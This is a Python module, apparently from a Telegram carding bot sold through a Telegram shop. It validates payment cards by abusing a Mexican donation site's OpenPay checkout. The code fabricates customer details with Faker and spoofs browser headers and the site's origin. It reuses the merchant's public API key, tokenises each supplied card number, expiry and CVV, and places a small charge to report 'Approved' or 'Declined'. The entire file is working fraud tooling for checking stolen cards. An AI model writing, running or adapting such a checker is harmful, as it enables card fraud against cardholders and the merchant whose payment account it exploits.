# ══════════════════════════════════════════════════════════════════════════
#  Coder: t.me/Vxsilisk  -  Shop: t.me/Sxgitario
# ══════════════════════════════════════════════════════════════════════════
import random, string, requests
from faker import Faker
from time import time as _time
from Commands.Gates._template import run_gate

_GATEWAY = 'OpenPay MX'
_f  = Faker('es_MX')
_dv = lambda: ''.join(random.choices(string.ascii_letters + string.digits, k=32))
_od = lambda: f"ord-{int(_time() * 1000)}"
_nm = lambda: (_f.first_name().replace(' ', '').replace('.', ''), _f.last_name().replace(' ', '').replace('.', ''))
_em = lambda: f"{_f.user_name()}@{random.choice(['hotmail.com', 'gmail.com', 'yahoo.com', 'outlook.com'])}"
_tl = lambda: str(random.randint(1000000000, 9999999999))

_UA  = 'Mozilla/5.0 (Linux; Android 7; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36'
_HDR = {
    'Host': 'api.openpay.mx', 'Connection': 'keep-alive',
    'sec-ch-ua-platform': '"Android"',
    'Authorization': 'Basic cGtfZDA0YjlkYTM1YTEyNGZiY2IzMmYzMmU5YmI5NjQ4MGE6',
    'User-Agent': _UA, 'Accept': 'application/json',
    'sec-ch-ua': '"Chromium";v="136", "Brave";v="136", "Not.A/Brand";v="99"',
    'Content-Type': 'application/json', 'sec-ch-ua-mobile': '?1',
    'Sec-GPC': '1', 'Accept-Language': 'es-MX,es;q=0.9',
    'Origin': 'https://reservacuxtal.com', 'Referer': 'https://reservacuxtal.com/',
}


def _found(html, start, end):
    try:
        s = html.index(start) + len(start)
        return html[s:html.index(end, s)]
    except ValueError:
        return None


def _flow(num, mes, ano, cvv):
    mes = mes.zfill(2)
    ano = ano[-2:] if len(ano) == 4 else ano

    last = ''
    for _ in range(3):
        try:
            sess = requests.Session()
            fsn, lst = _nm(); ord_id = _od(); ml = _em()

            data = {
                'amount': 5, 'currency': 'MXN',
                'description': 'Fondo Verde Reserva Cuxtal',
                'order_id': ord_id, 'send_email': 'false',
                'customer': {'name': fsn, 'last_name': lst, 'phone_number': _tl(), 'email': ml},
                'redirect_url': (f'https://reservacuxtal.com/openpay/success-payment.php'
                                 f'?name={fsn}&email={ml}&description=Fondo%20Verde%20Reserva%20Cuxtal&order_id={ord_id}'),
            }
            r1 = sess.post('https://api.openpay.mx/v1/mjserb9p38pujar5l3rn/public-checkouts',
                           headers=_HDR, json=data, timeout=20).json()
            ord_id2 = r1.get('id')
            link    = r1.get('checkout_link')
            if not ord_id2:
                return {'status': True, 'success': False, 'response': 'Declined ❌ | No Order ID'}

            r2    = sess.post('https://api.openpay.mx/v1/mjserb9p38pujar5l3rn/tokens',
                              headers=_HDR,
                              json={'expiration_month': mes, 'expiration_year': ano,
                                    'holder_name': f'{fsn} {lst}', 'card_number': num, 'cvv2': cvv},
                              timeout=20).json()
            token = r2.get('id')
            if not token:
                return {'status': True, 'success': False, 'response': 'Declined ❌ | No Card Token'}

            r3  = sess.get(link, headers=_HDR, allow_redirects=False, timeout=15)
            cap = r3.headers.get('Location', '')
            r4  = sess.get(f'{cap}/card_capture', headers=_HDR, timeout=15).text
            tdI = _found(r4, 'id="transactionId" value="', '"') or ''

            data = (f'tokenId={token}&transactionId={tdI}&checkoutId={ord_id2}'
                    f'&deviceSessionId={_dv()}'
                    f'&browserScreenHeight=306&browserScreenWidth=619'
                    f'&browserUserAgent={_UA}'
                    f'&browserLanguage=es-MX&browserJavaEnabled=false&browserJavaScriptEnabled=true&useCof=false')
            r5 = sess.post('https://api.openpay.mx/v1/card-payment/charge',
                           headers={**_HDR, 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'},
                           data=data, timeout=20)

            if '{"status":"error",' in r5.text:
                msg = r5.json().get('message', 'Unknown')
                return {'status': True, 'success': False, 'response': f'Declined ❌ | {msg[:120]}'}
            elif '{"status":"ok"' in r5.text and 'charge_pending' not in r5.text:
                return {'status': True, 'success': True, 'response': 'Approved ✅ | Charged Successfully'}
            elif 'charge_pending' in r5.text:
                return {'status': True, 'success': False, 'response': 'Declined ❌ | 3D Verify'}
            return {'status': True, 'success': False, 'response': f'Declined ❌ | {r5.text[:60]}'}
        except Exception as e:
            last = str(e)[:180]
    return {'status': False, 'raise': f'Retries exhausted: {last}'}


def _checker(cc, binData):
    try:
        return _flow(cc[0], cc[1], cc[2], cc[3])
    except Exception as e:
        return {'status': False, 'raise': str(e)[:200]}


def gateCmd(bot, update, gestion):
    run_gate(bot, update, gestion, gateway=_GATEWAY, checker=_checker)


def run_check(cc, bin_data, ctx=None):
    r = _checker(cc, bin_data)
    if not r.get('status'):
        return {'status': 'Error ⚠️', 'response': r.get('raise', 'Gate error')}
    return {'status': 'Approved ✅' if r.get('success') else 'Declined ❌',
            'response': r.get('response', '')}

# ══════════════════════════════════════════════════════════════════════════
#  Coder: t.me/Vxsilisk  -  Shop: t.me/Sxgitario
# ══════════════════════════════════════════════════════════════════════════
